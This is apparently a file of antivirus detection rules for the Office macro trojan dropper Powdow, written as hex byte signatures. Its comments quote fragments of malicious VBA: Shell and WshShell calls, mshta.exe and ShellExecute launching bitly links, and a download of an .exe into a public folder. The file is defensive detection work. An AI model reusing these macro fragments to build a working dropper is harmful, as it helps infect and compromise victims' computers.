
rule TrojanDropper_O97M_Powdow_SS_MTB{
	meta:
		description = "TrojanDropper:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_03_0 = {44 6c 6f 6b 6b 6f 6f 6b 61 2e 63 6f 70 79 66 69 6c 65 20 4f 69 77 61 2c 20 45 6e 76 69 72 6f 6e 24 28 22 50 55 42 4c 49 43 22 29 20 26 20 22 5c 6b 22 20 2b 20 22 6f 6f 2e 63 6f 22 20 2b 20 53 74 72 69 6e 67 28 31 2c 20 22 6d 22 29 2c 20 54 72 75 65 90 02 03 45 6e 64 20 53 75 62 90 00 } //01 00 
		$a_01_1 = {4c 6f 6b 6b 6f 75 6d 6d 7a 64 64 64 20 3d 20 4a 6f 69 6e 28 50 6f 6f 61 72 6f 6b 73 6b 7a 61 73 64 2c 20 22 22 29 } //01 00  Lokkoummzddd = Join(Pooarokskzasd, "")
		$a_01_2 = {53 68 65 6c 6c 20 28 6c 61 6b 61 6b 61 6b 61 29 } //00 00  Shell (lakakaka)
	condition:
		any of ($a_*)
 
}
rule TrojanDropper_O97M_Powdow_SS_MTB_2{
	meta:
		description = "TrojanDropper:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_03_0 = {53 65 74 20 90 02 20 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 90 02 25 28 22 35 37 35 33 22 29 20 26 20 90 1b 01 28 22 36 33 37 32 36 39 37 30 37 34 32 65 35 33 36 38 36 35 36 63 36 63 22 29 29 90 02 03 90 1b 00 2e 52 75 6e 20 28 63 6d 64 29 90 02 03 45 6e 64 20 53 75 62 90 00 } //01 00 
		$a_01_1 = {63 6d 64 20 3d 20 63 6d 64 30 20 26 20 63 6d 64 31 20 26 20 63 6d 64 32 } //01 00  cmd = cmd0 & cmd1 & cmd2
		$a_03_2 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 90 02 0f 2c 20 90 02 0f 2c 20 32 29 29 29 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDropper_O97M_Powdow_SS_MTB_3{
	meta:
		description = "TrojanDropper:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_03_0 = {28 30 2c 20 53 74 72 43 6f 6e 76 28 22 6f 70 65 6e 22 2c 20 90 02 04 29 2c 20 53 74 72 43 6f 6e 76 28 22 65 78 70 6c 6f 72 65 72 22 2c 20 90 02 04 29 2c 90 00 } //01 00 
		$a_03_1 = {3d 20 52 65 70 6c 61 63 65 28 90 02 25 2c 20 22 2e 63 6d 7a 22 2c 20 22 2e 63 6d 22 29 90 00 } //01 00 
		$a_03_2 = {53 6f 75 72 63 65 20 68 74 74 60 70 3a 2f 2f 90 02 50 2e 65 60 78 65 20 2d 44 65 73 74 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 90 02 20 2e 65 60 78 65 3b 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 90 1b 01 2e 65 60 78 65 90 00 } //01 00 
		$a_01_3 = {3d 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 64 73 73 64 64 2e 63 6d 7a 64 } //00 00  = "C:\Users\Public\dssdd.cmzd
	condition:
		any of ($a_*)
 
}
rule TrojanDropper_O97M_Powdow_SS_MTB_4{
	meta:
		description = "TrojanDropper:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {43 61 6c 6c 20 6f 62 6a 2e 4a 61 6e 75 67 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 28 6b 31 2e 75 31 2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 2c 20 22 68 74 74 70 73 3a 2f 2f 62 69 74 6c 79 2e 63 6f 6d 2f 65 74 79 77 75 69 71 64 68 62 73 67 6a 6a 22 2c 20 22 22 2c 20 22 6f 70 65 6e 22 2c 20 31 29 } //01 00  Call obj.Janug.ShellExecute(k1.u1.ControlTipText, "https://bitly.com/etywuiqdhbsgjj", "", "open", 1)
		$a_03_1 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 53 74 72 52 65 76 65 72 73 65 20 5f 90 02 03 28 22 30 22 20 2b 20 22 30 22 20 2b 20 22 30 22 20 2b 20 22 30 22 20 2b 20 22 34 22 20 2b 90 00 } //01 00 
		$a_03_2 = {22 36 22 20 2b 20 22 39 22 20 2b 20 22 30 22 20 2b 20 22 37 22 20 2b 20 22 33 22 20 2b 20 22 31 22 20 2b 20 22 3a 22 20 2b 20 22 77 22 20 2b 20 22 65 22 20 2b 20 22 6e 22 29 29 90 02 03 45 6e 64 20 46 75 6e 63 74 69 6f 6e 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDropper_O97M_Powdow_SS_MTB_5{
	meta:
		description = "TrojanDropper:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_03_0 = {56 42 5f 4e 61 6d 65 20 3d 20 22 4d 6f 64 75 6c 65 31 22 90 02 03 53 75 62 20 41 75 74 6f 5f 4f 70 65 6e 28 29 90 00 } //01 00 
		$a_01_1 = {44 65 62 75 67 2e 50 72 69 6e 74 20 4d 73 67 42 6f 78 28 22 45 52 52 4f 52 21 22 2c 20 76 62 4f 4b 43 61 6e 63 65 6c 29 3b 20 72 65 74 75 72 6e 73 3b 20 31 } //01 00  Debug.Print MsgBox("ERROR!", vbOKCancel); returns; 1
		$a_03_2 = {58 20 3d 20 22 6d 73 68 74 61 2e 65 78 65 20 22 90 02 03 59 20 3d 20 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 62 69 74 6c 79 2e 63 6f 6d 2f 22 90 02 03 5a 20 3d 20 22 90 02 25 22 90 02 03 44 65 62 75 67 2e 50 72 69 6e 74 20 58 90 00 } //01 00 
		$a_03_3 = {44 65 62 75 67 2e 50 72 69 6e 74 20 59 90 02 03 44 65 62 75 67 2e 50 72 69 6e 74 20 5a 90 02 03 44 65 62 75 67 2e 50 72 69 6e 74 20 28 53 68 65 6c 6c 28 58 20 2b 20 59 20 2b 20 5a 29 29 90 02 03 45 6e 64 20 53 75 62 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDropper_O97M_Powdow_SS_MTB_6{
	meta:
		description = "TrojanDropper:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 01 00 "
		
	strings :
		$a_03_0 = {4d 73 67 42 6f 78 20 22 4f 75 74 64 61 74 65 64 20 4f 66 66 69 63 65 20 56 65 72 73 69 6f 6e 22 90 02 03 41 63 74 69 76 65 53 68 65 65 74 2e 50 72 69 6e 74 4f 75 74 90 00 } //01 00 
		$a_01_1 = {49 75 65 6f 61 70 20 3d 20 53 70 6c 69 74 28 4b 6f 6e 67 6b 61 6f 2c 20 22 48 6b 61 64 68 69 65 6e 61 22 29 } //01 00  Iueoap = Split(Kongkao, "Hkadhiena")
		$a_01_2 = {4b 6f 6e 67 6b 61 6f 20 3d 20 53 68 65 65 74 73 28 22 53 68 65 65 74 31 22 29 2e 43 65 6c 6c 73 28 31 31 35 31 2c 20 35 31 29 2e 56 61 6c 75 65 } //01 00  Kongkao = Sheets("Sheet1").Cells(1151, 51).Value
		$a_01_3 = {53 75 6e 77 61 79 65 20 3d 20 22 4d 69 64 20 46 75 6e 63 74 69 6f 6e 20 6a 2e 6d 22 } //01 00  Sunwaye = "Mid Function j.m"
		$a_01_4 = {4c 61 73 74 57 6f 72 64 20 3d 20 4d 69 64 28 53 75 6e 77 61 79 65 2c 20 31 34 2c 20 34 29 20 26 20 53 74 72 69 6e 67 28 31 2c 20 22 70 22 29 } //01 00  LastWord = Mid(Sunwaye, 14, 4) & String(1, "p")
		$a_03_5 = {4e 4f 6b 75 65 33 20 3d 20 4c 61 73 74 57 6f 72 64 20 2b 20 22 2f 22 20 2b 20 22 90 02 20 22 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDropper_O97M_Powdow_SS_MTB_7{
	meta:
		description = "TrojanDropper:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_03_0 = {3d 20 4e 65 77 20 57 73 68 53 68 65 6c 6c 90 02 20 2e 72 75 6e 20 90 02 20 45 6e 64 20 46 75 6e 63 74 69 6f 6e 90 00 } //01 00 
		$a_03_1 = {3d 20 53 74 72 52 65 76 65 72 73 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 90 02 0f 22 29 2e 56 61 6c 75 65 29 90 00 } //01 00 
		$a_01_2 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 46 69 6e 64 2e 45 78 65 63 75 74 65 20 46 69 6e 64 54 65 78 74 3a 3d 22 25 35 22 2c 20 52 65 70 6c 61 63 65 57 69 74 68 3a 3d } //01 00  ActiveDocument.Content.Find.Execute FindText:="%5", ReplaceWith:=
		$a_03_3 = {52 65 70 6c 61 63 65 3a 3d 77 64 52 65 70 6c 61 63 65 41 6c 6c 90 02 03 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 61 76 65 41 73 32 20 46 69 6c 65 4e 61 6d 65 3a 3d 90 02 20 2c 20 46 69 6c 65 46 6f 72 6d 61 74 3a 3d 77 64 46 6f 72 6d 61 74 54 65 78 74 90 0c 02 00 73 20 90 02 20 45 6e 64 20 53 75 62 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDropper_O97M_Powdow_SS_MTB_8{
	meta:
		description = "TrojanDropper:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 01 00 "
		
	strings :
		$a_03_0 = {3d 20 4e 65 77 20 57 73 68 53 68 65 6c 6c 90 02 20 2e 72 75 6e 20 90 02 20 45 6e 64 20 46 75 6e 63 74 69 6f 6e 90 00 } //01 00 
		$a_03_1 = {52 65 70 6c 61 63 65 3a 3d 77 64 52 65 70 6c 61 63 65 41 6c 6c 90 02 03 45 6e 64 20 57 69 74 68 90 00 } //01 00 
		$a_03_2 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 61 76 65 41 73 32 20 46 69 6c 65 4e 61 6d 65 3a 3d 90 02 20 2c 20 46 69 6c 65 46 6f 72 6d 61 74 3a 3d 77 64 46 6f 72 6d 61 74 54 65 78 74 90 02 03 73 20 90 02 20 45 6e 64 20 53 75 62 90 00 } //01 00 
		$a_03_3 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 46 69 6e 64 90 02 03 2e 45 78 65 63 75 74 65 20 46 69 6e 64 54 65 78 74 3a 3d 22 23 29 22 2c 20 52 65 70 6c 61 63 65 57 69 74 68 3a 3d 90 00 } //01 00 
		$a_03_4 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 90 02 0f 22 29 2e 56 61 6c 75 65 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}